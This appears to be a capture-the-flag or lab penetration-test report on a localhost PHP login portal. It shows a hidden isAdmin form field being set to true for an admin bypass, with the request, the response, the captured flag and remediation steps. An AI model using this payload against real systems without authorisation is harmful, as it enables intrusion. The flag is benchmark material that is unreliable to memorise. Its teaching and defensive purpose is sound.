## TL;DR
- Objective: Bypass the login form on target 127.0.0.1:32957
- Outcome: ACHIEVED - Authentication bypass successful, admin access granted
- Highest-impact finding: Hidden Form Field Manipulation vulnerability allowing complete authentication bypass
- Validation status: Confirmed with flag captured

## Target Information
- Target: 127.0.0.1:32957
- Host / base URL: http://127.0.0.1:32957/
- Application or component: PHP login portal
- Authentication context: Unauthenticated initial access; vulnerable privilege escalation via hidden form field
- Relevant technology details:
  - Server: Apache/2.4.25 (Debian)
  - Backend: PHP/5.6.40
  - Endpoint: /index.php

## Confirmed Vulnerability
### Hidden Form Field Manipulation (Authentication Bypass)
- Affected endpoint / component: POST /index.php
- Impact: Complete authentication and authorization bypass - attacker can gain admin privileges without valid credentials
- Preconditions: None; accessible to unauthenticated users
- Exact payload or PoC:
  ```
  username=test&password=test&isAdmin=true
  ```

## Steps to Reproduce
1. Navigate to http://127.0.0.1:32957/ and observe the login form containing a hidden field:
   ```html
   <input type="hidden" name="isAdmin" value="false" />
   ```
2. Send a POST request to /index.php with the following parameters:
   - username=test (or any arbitrary value)
   - password=test (or any arbitrary value)
   - isAdmin=true (modified from default "false")
3. Observe that the server responds with admin access and flag disclosure, bypassing all authentication checks

## Validation / Evidence
- Validation token / flag: `FLAG{46c3ef043123012aa7ed0ab5a0c6a7e40a53a624ce3ae406f52e7301a8033a9b}`
- Tool evidence: Direct HTTP request manipulation confirmed vulnerability
- Request evidence:
  ```
  POST /index.php HTTP/1.1
  Host: 127.0.0.1:32957
  Content-Type: application/x-www-form-urlencoded

  username=test&password=test&isAdmin=true
  ```
- Response evidence:
  ```html
  <center><h2>Welcome Admin</h2></center>
  <center><h3>Congratulations, here is the flag: FLAG{46c3ef043123012aa7ed0ab5a0c6a7e40a53a624ce3ae406f52e7301a8033a9b}</h3></center>
  ```
- Notes on reliability / limitations: Exploitation is 100% reliable; no session management or additional authentication checks were enforced by the application

## Remediation
- Root cause: The application relies on a client-controlled hidden form field (`isAdmin`) to determine user privilege levels. The server-side code trusts this client input without validation, allowing attackers to arbitrarily escalate privileges by modifying the submitted value from "false" to "true".
- Recommended fix:
  1. Remove the `isAdmin` parameter from client-visible forms entirely
  2. Implement server-side privilege determination based on authenticated user identity (e.g., database lookup after valid credential verification)
  3. Validate that the authentication check occurs before any privilege assignment
  4. Implement proper session management with server-side storage of user roles/privileges
- Defense-in-depth:
  1. Apply principle of least privilege - never trust client input for security decisions
  2. Implement multi-factor authentication for admin access
  3. Add server-side logging of privilege escalation attempts
  4. Use prepared statements and parameterized queries for authentication lookups

## How to Verify the Fix
1. Intercept the login request and attempt to add/modify the `isAdmin=true` parameter
2. Submit arbitrary credentials with the modified parameter
3. **Expected secure result**: Server should reject the request, ignore the `isAdmin` parameter, or return authentication failure regardless of the parameter value. The server should only determine admin status after successful credential verification against a trusted data store.
4. Verify that authenticated admin users have their privileges determined by server-side session data, not client-submitted parameters

## Remaining Leads
- Confirmed blockers: None - vulnerability fully exploited
- Unverified leads: None
- Missing context: None
